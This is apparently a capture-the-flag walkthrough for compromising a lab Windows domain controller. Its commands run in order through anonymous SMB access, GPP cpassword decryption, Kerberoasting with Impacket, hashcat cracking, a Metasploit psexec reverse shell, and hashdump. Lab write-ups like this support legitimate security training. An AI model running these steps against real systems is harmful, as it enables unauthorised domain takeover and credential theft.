Once we've performed NMAP Scan on the computer, we see it has port 445 SMB Open. So we can see if it has ANONYMOUS LOGIN by using smbclient and simply pressing enter whenever we are required to authenticate:
$ smbclient -L \\\\10.10.10.100\\
[PRESS ENTER WHEN PASSWORD PROMPTED]

We can see all of the machine Sharenames.

We can try to connect to them:
$ smbclient \\\\10.10.10.100\\ADMIN$

We will receive "Anonymous Login Successful" but we will fail to connect with "NT_STATUS_ACCESS_DENIED". So the key here is to connect to the "Replication" share folder (listed on above command).
$ smbclient \\\\10.10.10.100\Replication

And we are presented with SMB Prompt:
smb : \>

Type help and play around with the commands.

> RECURSE ON
> PROMPT OFF
> mget * 

Above will download everything to our computer.

This will download a bunch of folders, but we wanna take a look at the groups.xml file which is in directory structure: "<domain>/Policies/<sid>/MACHINE/Preferences/Groups/groups.xml". This groups.xml file is related to something
called "GPP" (Group Policy Preferences). It allows domain admins to create domain policies using embedded credentials. What we are looking here is for the "cpassword" field on the groups.xml file. Also look for the userName tag field to see which to which account the cpassword belongs to.

Copy the cpassword from .xml file and try to decrypt it using:
$ gpp-decryt <CPASSWORD>
If we receive a warning for cipher deprecated, ignore it. The line after that is the Decrypted password (i.e GPPstillStandingStrong2k18). 

We will be using Impacket tool called: GetUserSPNs.py
$ locate GetUserSPNs 
$ /opt/impacket/examples/GetUserSPNs.py <account that appears on "userName" tag field of groups.xml file> -dc-ip <IP Of Domain Controller> -request (this will request a Kerberos ticket -TGT- in order to be granted a TGS; Ticket Granting Service, ticket).
<COPY THE DECRYPTED PASSWORD, i.e GPPstillStandingStrong2k18).
This will return the Kerberos 5 TGS Ticket with the access and privileges of the Account that we specified. We can take that ticket offline and try to crack it and see if we can back a cleartext password. We can use Hashcat:
$ hashcat -m 13100 <file containing the Kerberos 5 TGS ticket> <Wordlist file, i.e rockyou.txt> (WE CAN RUN THIS COMMAND ON WINDOWS IN ORDER TO USE OUR GRAPHIC VIDEO CARD AS THE GPU FOR FASTER CRACKING).
If cracked, you will receive the "Status.....Cracked" and the Credential will be above it at the end of the Kerberos TGS Ticket.

Now that we have the password (credentials), we can load metasploit and use psexec:
$ msfconsole > use exploit/windows/smb/psexec
> set smbdomain <domain name; this is the domain found before the '/' on the userName tag field of the groups.xml file>
> set smbuser <username; this is the username found after the '/' on the userName tag field of the groups.xml file>
> set smbpass <the cracked credentials from hashcat>
> set rhost <ip of domain controller>
> set lhost <ip of kali machine>
> run
It uses Powershell to deliver the payload, but we can use another one
> show targets
> set target 2 (Native Upload)
> run 
And we get a shell back!
> sysinfo
> getuid (if we can NT AUTHORITY/SYSTEM, we have FULL access on the compromised PC)
> load incognito
> list_token -u
> hashdump


We can use a metasploit exploit to automate attacks after we get GPP creds as well:
msfconsole > search gpp
msfconsole > use post/windows/gather/credentials/gpp

TGS -> Stands for Ticket Granting Service (from Kerberos).
